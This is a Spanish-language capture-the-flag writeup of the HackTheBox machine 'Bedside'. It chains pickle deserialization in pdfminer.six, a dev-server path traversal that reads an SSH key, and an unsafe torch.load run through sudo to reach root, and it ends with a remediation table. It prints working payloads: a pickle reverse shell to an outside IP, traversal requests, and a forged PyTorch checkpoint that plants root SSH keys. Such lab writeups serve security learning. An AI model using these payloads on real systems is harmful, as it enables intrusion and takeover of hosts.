---
title: "HTB Bedside — pickle RCE + path traversal + torch.load() a root"
date: 2026-07-21 10:00:00 -0400
categories: [Writeups, Linux]
tags: [htb, linux, docker, pickle, deserialization, pytorch, oscp]
---

## Resumen

**Bedside** es una máquina Linux de HTB (Docker / ML Pipeline), multi-etapa, que atraviesa **dos contenedores Docker** hasta llegar a root: deserialización insegura de `pickle` en un pipeline de `pdfminer.six`, un path traversal en un dev-server interno (esm.sh/x), y un `torch.load()` inseguro disparado vía `sudo` sobre un volumen compartido.

| Campo | Valor |
|---|---|
| IP | `10.129.57.130` |
| SO | Linux · Docker |
| Vhost | `research.bedside.htb` |
| Técnicas | pickle deserialization · path traversal · torch.load insecure |

## Reconocimiento

Superficie mínima: solo SSH y HTTP.

```bash
nmap -p- --min-rate 2000 -T4 10.129.57.130

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> Cuando el escaneo de puertos es corto, no es mala señal: indica que el reto está en la capa de aplicación (lógica de negocio, subida de ficheros, APIs internas), no en servicios mal configurados de red.
{: .prompt-tip }

```bash
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: research.bedside.htb" http://10.129.57.130/
# 200
```

> Siempre que un dominio `*.htb` aparezca en un certificado, un banner o el enunciado, date de alta en `/etc/hosts` de inmediato.
{: .prompt-tip }

## Descubrimiento y subida de archivos

`research.bedside.htb` es un portal para subir estudios (PDF/ZIP) de una clínica ficticia. El formulario postea a `/` con el campo `uploadFile` vía `multipart/form-data`.

```bash
curl -s -X POST http://research.bedside.htb/ -F "uploadFile=@test.pdf" | grep message

<div class="message">File uploaded successfully: test.pdf</div>
```

> Cualquier "sube tu archivo aquí" en una app clínica/educativa/interna suele ocultar un pipeline de procesamiento asíncrono (cron, cola, watcher) que parsea el fichero con alguna librería de terceros. Ese parser es la superficie real de ataque, no el formulario en sí.
{: .prompt-tip }

## RCE · Deserialización insegura (pickle)

Tras el foothold se confirma que un proceso interno, `pdf_watcher.py`, revisa `uploads/` cada 30s y ejecuta `pdf2txt.py` (CLI de **pdfminer.six**) sobre cada PDF. Un `/Encoding` de fuente Type0 manipulado hace que pdfminer resuelva una ruta absoluta arbitraria y **deserialice con `pickle`** el recurso CMap que encuentra ahí, sin validar su origen.

```python
import pickle, gzip, os

class RCE:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.16.60/4444 0>&1'",))

with gzip.open("payload.pickle.gz", "wb") as f:
    pickle.dump(RCE(), f)
```

> **El gadget `__reduce__`:** cuando `pickle.load()` deserializa un objeto, invoca su método especial `__reduce__` para reconstruirlo. Si devuelve `(os.system, (cmd,))`, pickle literalmente ejecuta `os.system(cmd)` durante la deserialización.
{: .prompt-danger }

> `pickle`, `PyYAML.load` sin `SafeLoader`, `torch.load` con `weights_only=False` y `marshal` comparten el mismo defecto de diseño: mezclan *datos* con *código ejecutable*. Nunca deserialices datos de origen no confiable con estas APIs.
{: .prompt-tip }

El PDF no lleva el payload embebido: solo referencia, vía el nombre de fuente `/Encoding`, la ruta absoluta donde se sube el `.pickle.gz` (el carácter `/` se codifica como `#2F` en un name object PDF):

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
BASENAME   = f"px{int(time.time())}"   # nombre único por subida
abspath    = f"{UPLOAD_DIR}/{BASENAME}"
enc_name   = abspath.replace("/", "#2F")

# dentro del PDF:
# 4 0 obj << /Type /Font /Subtype /Type0 /Encoding /{enc_name} ... >>
```

> Cuando una librería de parsing "resuelve recursos externos por nombre" (fuentes, XML entities, includes de plantillas...), sospecha inmediatamente de path traversal o carga arbitraria de archivos — el mismo patrón que XXE o SSTI, aplicado a un formato binario.
{: .prompt-tip }

Listener + subida simultánea del PDF trampa y el pickle malicioso:

```bash
nc -lvnp 4444 &
curl -s -X POST http://research.bedside.htb/ -F "uploadFile=@px1784606997.pdf"
curl -s -X POST http://research.bedside.htb/ -F "uploadFile=@px1784606997.pickle.gz"

# ~30s después, cuando pdf_watcher.py procesa el PDF...
connect to [10.10.16.60] from (UNKNOWN) [10.129.57.130] 43078
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
```

> Usá siempre un FIFO no bloqueante (`mkfifo` + `<>`) en vez de `echo cmd | nc` para poder enviar varios comandos a la misma shell reversa sin que el proceso `nc` se quede sin stdin y muera.
{: .prompt-tip }

## Post-explotación · Contenedor

La shell aterriza dentro de un contenedor Docker (`data-wrangler`), aislado del resto de la infraestructura.

```bash
hostname; id; cat /app/pdf_watcher.py | head -20

data-wrangler
uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
# confirma: glob uploads/*.pdf -> pdf2txt.py cada SLEEP_INTERVAL=30s
```

> En contenedores sin `ps`/`netstat`, recurre a `/proc/<pid>/fd`, `/proc/net/tcp` y `/proc/net/tcp6` leyendo directamente el pseudo-filesystem — casi nunca están bloqueados aunque falten los binarios "de comodidad".
{: .prompt-tip }

Un servicio interno solo accesible en `127.0.0.1:3000` resulta ser un segundo contenedor: el dev-server de "Bedside Clinic - Image Viewer", servido con **esm.sh/x**.

```bash
curl -s http://127.0.0.1:3000/ | tail -3
<script>console.log("%c💚 Built with esm.sh/x...")</script>
```

## Path Traversal · Dev-server interno

El dev-server de esm.sh/x sirve archivos estáticos desde el directorio del proyecto sin sanear `../` en la ruta. `curl --path-as-is` evita que curl normalice el traversal localmente antes de enviarlo.

```bash
curl --path-as-is -s 'http://127.0.0.1:3000/../../../../etc/passwd'

developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
```

> Por defecto, curl "limpia" la URL y colapsa `/a/../b` a `/b` antes de enviar la petición. `--path-as-is` desactiva esa normalización y manda los `../` literales al servidor.
{: .prompt-tip }

Este segundo contenedor tiene su propio `/etc/passwd`: es una máquina distinta a `data-wrangler`, confirmando el salto de contenedor sin una segunda RCE. `developer` (uid 1000) es la cuenta interesante.

```bash
curl --path-as-is -s 'http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa'

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW...
-----END OPENSSH PRIVATE KEY-----
```

> Ante cualquier "dev server" expuesto internamente (Vite, webpack-dev-server, esm.sh, live-server...) probá siempre el traversal más simple primero antes de perseguir CVEs específicos — muchas de estas herramientas de desarrollo nunca fueron pensadas para exponerse.
{: .prompt-tip }

## Foothold · SSH y User flag

El puerto 22 del host sí es alcanzable directamente desde fuera. La clave robada autentica de inmediato como `developer`.

```bash
chmod 600 developer_id_rsa
ssh -i developer_id_rsa developer@10.129.57.130 "id; cat ~/user.txt"

uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
```

> Nunca asumas que credenciales robadas "dentro" de un contenedor solo sirven "dentro". Probalas siempre contra el host real y contra cualquier otro servicio expuesto: la reutilización de credenciales entre capas de la infraestructura es la norma.
{: .prompt-tip }

**User flag:** `161d61ff323f4d6c0d09fb23f8617aab`

## Pivote · Volumen compartido `/datastore`

`sudo -l` revela un único comando NOPASSWD: un entrenador MONAI/PyTorch que carga el checkpoint más reciente con `torch.load()`. El bloqueo: `developer` no tiene permisos sobre el directorio de checkpoints — pero `datawrangler` (la primera shell) sí.

```bash
sudo -l

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

> La entrada no lleva comodín tras el nombre del script. Cualquier argumento extra hace que el comando ya no coincida literalmente con la regla NOPASSWD, y sudo pide contraseña.
{: .prompt-warning }

`/datastore` aparece como `drwxrwx--- datawrangler:dataops` tanto dentro del contenedor `data-wrangler` como en el host `bedside` — mismo uid:gid a ambos lados. Todo lo que `datawrangler` escriba ahí, el script que corre como **root** vía sudo lo va a leer.

Extracto real del *sink*, `bedside_trainer.py`:

```python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)  # sorted by mtime
if latest_ckpt:
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    loader(engine)  # internamente: torch.load(path, weights_only=False)
```

No hay validación de firma, hash ni origen del `.pt`: cualquier archivo con la extensión correcta y mtime más reciente se deserializa tal cual, con `weights_only=False`.

## Root · `torch.load()` inseguro

Se fabrica un checkpoint `.pt` con el mismo gadget `__reduce__` de la fase anterior, se deja en `/datastore/checkpoints/` desde la shell de `datawrangler`, y se dispara el script permitido por sudo como `developer`.

Un pickle "crudo" no basta: `torch.load()` exige el formato legacy de PyTorch (magic number + versión de protocolo + `sys_info` antes del objeto real). Se replica sin necesitar `torch` instalado:

```python
import pickle, os

CMD = ("mkdir -p /root/.ssh && "
       "echo '<pubkey-developer>' >> /root/.ssh/authorized_keys && "
       "chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && "
       "cp /root/root.txt /tmp/root_flag.txt && chmod 644 /tmp/root_flag.txt")

class RCE:
    def __reduce__(self):
        return (os.system, (CMD,))

MAGIC_NUMBER, PROTOCOL_VERSION = 0x1950a86a20f9469cfc6c, 1001
sys_info = {'protocol_version': PROTOCOL_VERSION, 'little_endian': True,
            'type_sizes': {'short':2,'int':4,'long':8}}

with open("checkpoint_epoch_9999.pt", "wb") as f:
    pickle.dump(MAGIC_NUMBER, f, protocol=2)
    pickle.dump(PROTOCOL_VERSION, f, protocol=2)
    pickle.dump(sys_info, f, protocol=2)
    pickle.Pickler(f, protocol=2).dump(RCE())
```

> Antes del formato ZIP (PyTorch ≥1.6), `torch.save` escribía cuatro objetos pickle consecutivos: número mágico, versión de protocolo, información de sistema y el objeto real. `torch.load` detecta que el archivo no es un ZIP válido y cae automáticamente al parser legacy, que sigue siendo pura deserialización pickle.
{: .prompt-danger }

> Cuando un exploit de deserialización falla con un error de "formato" o "magic number", no lo descartes: casi siempre significa que vas por el camino correcto y solo falta imitar el contenedor exacto que la librería espera.
{: .prompt-tip }

Se escribe el checkpoint en el volumen compartido desde la shell de `datawrangler`, y se dispara el entrenador vía sudo como `developer`:

```bash
# [contenedor data-wrangler]
$ cp checkpoint_epoch_9999.pt /datastore/checkpoints/

# [ssh developer]
$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_9999.pt...
# torch.load() deserializa -> os.system(CMD) se ejecuta como root
```

> **Detalle de depuración real:** el watcher de la fase de pickle seguía re-procesando un PDF viejo cada 30s, dejando ficheros `.txt` vacíos en `/datastore/processed`. Como MONAI no sabe leer texto como imagen, el `DataLoader` podía reventar antes de llegar a la carga del checkpoint. Solución: sembrar el directorio con imágenes válidas para diluir la probabilidad de que el lote aleatorio incluyera el archivo basura.
{: .prompt-warning }

```bash
ssh -i developer_id_rsa root@10.129.57.130 "id; cat /root/root.txt"

uid=0(root) gid=0(root) groups=0(root)
```

**Root flag:** `ac003417c24407aba7b5ddf45ed9d444`

## Remediación

| Vulnerabilidad | Severidad | Mitigación |
|---|---|---|
| Deserialización insegura en pdfminer.six (CMap vía `/Encoding` con ruta absoluta → RCE) | Crítica | Actualizar pdfminer.six; procesar PDFs subidos por usuarios en un sandbox aislado (gVisor/firejail) sin acceso al filesystem real |
| Path traversal en dev-server (esm.sh/x) | Alta | No exponer herramientas de desarrollo fuera de `localhost`/red de confianza; nunca en producción |
| Regla sudoers NOPASSWD sobre script de entrenamiento | Media | Evitar NOPASSWD salvo necesidad operativa estricta; ejecutar el trainer con un usuario de servicio sin privilegios de root |
| `torch.load(weights_only=False)` | Crítica | Usar `weights_only=True` (por defecto desde PyTorch 2.6); verificar firma/hash de cada checkpoint antes de cargarlo |
| Volumen `/datastore` compartido entre contenedor no confiable y proceso root | Alta | Aislar por completo los volúmenes que alimentan procesos privilegiados; montar como solo-lectura donde sea posible |

**Herramientas:** `nmap` · `curl` · `pdfminer.six (pdf2txt.py)` · `python3 / pickle` · `netcat + FIFO` · `ssh` · `python3 http.server` · `torch / MONAI`
